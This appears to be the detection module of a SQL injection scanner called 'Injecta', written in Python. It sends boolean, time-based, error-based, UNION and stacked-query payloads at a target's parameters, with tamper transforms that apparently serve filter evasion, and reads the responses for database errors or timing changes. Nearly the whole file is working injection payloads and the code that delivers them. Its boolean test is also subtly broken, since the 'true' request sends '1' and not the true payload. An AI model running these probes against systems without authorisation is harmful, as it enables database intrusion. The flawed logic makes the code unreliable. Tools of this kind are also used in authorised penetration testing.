"""
Injecta — Injection detection engine with stacked query & tamper support
"""
import re
import urllib.parse
from typing import Dict, List, Optional, Tuple, Any
from injecta.core.logger import VoidLogger
from injecta.utils.tamper import apply_tampers


class Detector:
    def __init__(self, requester, config, logger: VoidLogger):
        self.req = requester
        self.config = config
        self.log = logger
        self.tamper = []
        self._baseline = {}

    def set_tamper(self, tamper_names: List[str]):
        self.tamper = tamper_names

    def fetch_baseline(self, url: str) -> bool:
        resp, err = self.req.request(url)
        if err or resp is None:
            self.log.error(f"Baseline request failed: {err}")
            return False
        self._baseline["_global"] = {
            "status": resp.status_code,
            "length": len(resp.text),
            "text": resp.text,
            "headers": dict(resp.headers),
            "time": resp.elapsed.total_seconds(),
        }
        self.log.debug(f"Baseline: {resp.status_code} | {len(resp.text)} bytes | {resp.elapsed.total_seconds():.3f}s")
        return True

    def find_injection_points(self, url: str) -> List[str]:
        params = []
        if "?" in url and self.config.method == "GET":
            qs = url.split("?", 1)[1]
            for part in qs.split("&"):
                if "=" in part:
                    params.append(part.split("=", 1)[0])
        if self.config.data:
            for part in self.config.data.split("&"):
                if "=" in part:
                    params.append(part.split("=", 1)[0])
        if not params:
            params.append("id")
        return params

    def test_parameter(self, url: str, param: str, technique: str = "B") -> Optional[Dict[str, Any]]:
        self.log.debug2(f"Testing param '{param}' with technique '{technique}'")
        if technique == "B":
            return self._test_boolean(url, param)
        elif technique == "T":
            return self._test_time(url, param)
        elif technique == "E":
            return self._test_error(url, param)
        elif technique == "U":
            return self._test_union(url, param)
        elif technique == "S":
            return self._test_stacked(url, param)
        return None

    def _detectable_difference(self, resp_text: str, baseline_text: str) -> bool:
        bl = self._baseline.get("_global", {})
        if not bl:
            return False
        len_diff = abs(len(resp_text) - len(baseline_text))
        if len_diff > 5 and len_diff > len(baseline_text) * 0.05:
            return True
        error_kw = ["error", "warning", "mysql", "syntax", "unexpected", "ORA-", "MSSQL", "driver"]
        bl_errors = sum(1 for kw in error_kw if kw.lower() in baseline_text.lower())
        resp_errors = sum(1 for kw in error_kw if kw.lower() in resp_text.lower())
        if abs(resp_errors - bl_errors) >= 1:
            return True
        return False

    def _apply(self, payload: str) -> str:
        if self.tamper:
            return apply_tampers(payload, self.tamper)
        return payload

    def _test_raw(self, url: str, payload: str, param: str):
        return self.req.test_raw(url, self._apply(payload), param)

    def _test_boolean(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        bl = self._baseline.get("_global", {})
        if not bl:
            return None

        true_payloads = [
            "1 AND 1=1", "1' AND '1'='1", '1" AND "1"="1',
            "1) AND 1=1", "1')) AND 1=1",
        ]
        false_payloads = [
            "1 AND 1=2", "1' AND '1'='2", '1" AND "1"="2',
            "1) AND 1=2", "1')) AND 1=2",
        ]

        for i in range(min(len(true_payloads), len(false_payloads))):
            _, true_text, true_time = self._test_raw(url, "1", param)
            _, false_text, _ = self._test_raw(url, false_payloads[i], param)
            if true_text and false_text:
                diff_true = self._detectable_difference(true_text, bl.get("text", ""))
                diff_false = self._detectable_difference(false_text, bl.get("text", ""))
                if diff_true and not diff_false:
                    return {"param": param, "technique": "boolean",
                            "true_payload": true_payloads[i], "false_payload": false_payloads[i],
                            "confidence": 0.8}
        return None

    def _test_time(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        time_payloads = [
            ("1 AND SLEEP(3)", "mysql"),
            ("1' AND SLEEP(3)-- -", "mysql"),
            ("1; WAITFOR DELAY '0:0:3'", "mssql"),
            ("1' ; WAITFOR DELAY '0:0:3'--", "mssql"),
            ("1 AND pg_sleep(3)", "postgresql"),
            ("1' AND pg_sleep(3)--", "postgresql"),
        ]

        _, _, base_time = self._test_raw(url, "1", param)
        if base_time is None:
            return None

        for payload, dbms in time_payloads:
            _, _, injected_time = self._test_raw(url, payload, param)
            if injected_time is not None and injected_time >= 2.5:
                return {"param": param, "technique": "time", "payload": payload,
                        "dbms_hint": dbms, "response_time": injected_time,
                        "baseline_time": base_time, "confidence": 0.9}
        return None

    def _test_error(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        error_payloads = [
            ("1'", "generic"),
            ("1' AND extractvalue(1, concat(0x7e, (SELECT 1)))-- -", "mysql"),
            ("1' AND updatexml(1, concat(0x7e, (SELECT 1)), 1)-- -", "mysql"),
            ("1' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT 1), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) a)-- -", "mysql"),
            ("1' AND 1=CAST((SELECT 1) AS int)--", "postgresql"),
            ("1' AND 1=CONVERT(int, (SELECT 1))--", "mssql"),
        ]

        baseline = self._baseline.get("_global", {}).get("text", "")

        for payload, dbms in error_payloads:
            _, resp_text, _ = self._test_raw(url, payload, param)
            if resp_text:
                db_errors = re.search(
                    r'(SQL syntax|mysql_fetch|Warning.*mysql|ORA-\d{5}|MSSQL|'
                    r'Unclosed quotation|Incorrect syntax|PostgreSQL.*ERROR|'
                    r'SQLite/JDBCDriver|driver.*error|syntax error)',
                    resp_text, re.IGNORECASE
                )
                if db_errors:
                    return {"param": param, "technique": "error", "payload": payload,
                            "dbms": dbms if dbms != "generic" else "unknown",
                            "error_message": db_errors.group(0), "confidence": 0.95}
        return None

    def _test_union(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        for col_count in range(1, 11):
            nulls = ",".join(["NULL"] * col_count)
            payloads = [
                f"1 UNION SELECT {nulls}",
                f"1' UNION SELECT {nulls}-- -",
                f'1" UNION SELECT {nulls}-- -',
                f"1) UNION SELECT {nulls}-- -",
                f"1')) UNION SELECT {nulls}-- -",
            ]
            for p in payloads:
                _, resp_text, _ = self._test_raw(url, p, param)
                if resp_text and resp_text != self._baseline.get("_global", {}).get("text", ""):
                    if self._detectable_difference(resp_text, self._baseline.get("_global", {}).get("text", "")):
                        return {"param": param, "technique": "union", "payload": p,
                                "column_count": col_count, "confidence": 0.85}
        return None

    def _test_stacked(self, url: str, param: str) -> Optional[Dict[str, Any]]:
        bl = self._baseline.get("_global", {})
        if not bl:
            return None

        baseline_text = bl.get("text", "")
        stacked_payloads = [
            ("mysql", "1; SELECT 1; -- -"),
            ("mysql", "1'; SELECT 1; -- -"),
            ("mssql", "1; SELECT 1; --"),
            ("mssql", "1'; SELECT 1; --"),
            ("postgresql", "1; SELECT 1; --"),
            ("postgresql", "1'; SELECT 1; --"),
        ]

        for dbms, payload in stacked_payloads:
            _, resp_text, _ = self._test_raw(url, payload, param)
            if resp_text:
                diff = self._detectable_difference(resp_text, baseline_text)
                if diff:
                    return {"param": param, "technique": "stacked", "payload": payload,
                            "dbms_hint": dbms, "confidence": 0.7}
                error_hint = re.search(
                    r'(You have an error in your SQL syntax.*near|Incorrect syntax near|'
                    r'Unclosed quotation|syntax error at or near)',
                    resp_text, re.IGNORECASE
                )
                if error_hint:
                    return {"param": param, "technique": "stacked", "payload": payload,
                            "dbms_hint": dbms, "confidence": 0.6}
        return None
